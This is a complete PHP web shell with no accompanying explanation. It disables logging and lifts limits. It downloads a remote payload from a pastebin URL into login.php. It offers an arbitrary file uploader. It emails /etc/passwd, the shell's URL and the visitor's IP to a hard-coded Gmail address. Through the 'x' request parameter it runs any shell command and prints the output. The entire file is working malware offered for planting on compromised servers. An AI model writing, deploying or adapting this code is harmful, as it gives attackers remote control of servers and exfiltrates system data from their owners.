<?php
error_reporting(1);
ignore_user_abort(false);
ini_set('error_log', null);
set_time_limit(0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '999999999M');
ini_set('log_errors', 0);
ini_set('output_buffering', 0);
ini_set('display_errors', 0);
ini_restore("safe_mode_include_dir");
ini_restore("safe_mode_exec_dir");
ini_restore("disable_functions");
ini_restore("allow_url_fopen");
ini_restore("safe_mode");
ini_set('zlib.output_compression', 'Off');
if (!file_exists('login.php')) {
    $tulis = fopen('login.php', "w");
    $file = file_get_contents('https://pastebin.com/raw/XsHL7qxq');
    fwrite($tulis, $file);
    chmod('login.php', '0444');
    fclose($tulis);
}

if (isset($_REQUEST['open'])) {
    echo '
<center>
    <form method="post" enctype="multipart/form-data" name="uploader">
        <input type="file" name="file" size="50">
        <input name="_upl" type="submit" value="Upload">
    </form>
</center>';
    if ($_POST['_upl'] == "Upload") {
        if (copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
            echo "<script>alert('OK');</script>";
        } else {
            echo "<script>alert('Failed');</script>";
        }
    }
} elseif (isset($_REQUEST['mail'])) {
    $passwd = file_get_contents('/etc/passwd');
    $shell_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
    $email = "gedzsarjuncomuniti@gmail.com";
    $subject = "Logger";
    $from = "From:Cvar1984";
    $content_mail =
        "URL : $shell_path\nIP : " .
        $_SERVER['REMOTE_ADDR'] .
        "\n**********\n$passwd\n**********\nBy Cvar1984";
    mail($email, $subject, $content_mail, $from);
    unset($passwd, $shell_path, $email, $subject, $from, $content_mail);
} elseif (isset($_REQUEST['disable'])) {
    if (!@ini_get('disable_functions')) {
        echo "<p>All Safe</p>";
    } else {
        echo '<pre>' . @ini_get('disable_functions') . '</pre>';
    }
} elseif (isset($_REQUEST['x'])) {
    echo '<pre>';
    exec($_REQUEST['x'] . ' 2>&1', $res);
    $len = count($res);
    for ($x = 0; $x < $len; $x++) {
        echo $res[$x] . '<br/>';
    }
    echo '</pre>';
}
